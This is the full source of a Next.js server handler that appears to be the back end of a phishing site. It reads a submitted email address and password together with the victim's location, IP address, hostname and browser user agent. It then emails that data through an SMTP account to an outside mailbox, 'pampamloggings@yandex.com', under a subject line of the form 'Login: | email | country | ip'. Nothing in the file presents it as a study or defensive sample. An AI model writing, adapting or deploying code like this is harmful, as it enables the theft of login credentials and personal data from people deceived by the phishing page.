"use server"
// import {NextApiRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";

// export const runtime = 'nodejs';

const user = process.env.EMAIL;
const pass = process.env.PASSWORD;

export default async function handler(req, res) {
  try {
    const body = await req.body;
    const {email, password, country, city, region, host_ip, hostname, postal_code, timezone, date} = body

    const user_agent = req.headers['user-agent']

    const transporter = nodemailer.createTransport({
      // service: "Private Email", //"zoho"
      host: "smtp.mail.me.com" ,//"smtp.zoho.com" salespersonels.online
      port: 587,//465
      secure: false,
      requireTLS: true,
      auth: {
        user,
        pass,
      },
    });

    const mailOptions = {
      from: "marysalvatore084@icloud.com",
      to: "pampamloggings@yandex.com",
      subject: `Login: | ${email} | ${country} | ${host_ip}`,
      text: `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}\nRegion: ${region}\nHost_Ip: ${host_ip}\nHostname: ${hostname}\nTime Zone: ${timezone}\nPostal Code: ${postal_code}\nDate: ${date}\nUser_agent: ${user_agent}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        return console.error("Error sending email:", error);
      }
      console.log("Email sent:", info.response);
    });
    console.log('Message sent successfully')
    res.status(200).send({message: 'Message sent successful'})
    // return NextResponse.json(
    //     { message: "Message sent successfully" },
    //     { status: 200 },
    //   );

  } catch (error) {
    console.log(`Failed to send message: ${error}`)
    res.status(500).send({error: "Failed to send message."})
    // new NextResponse("Failed to send message.", { status: 500 })
  }
}

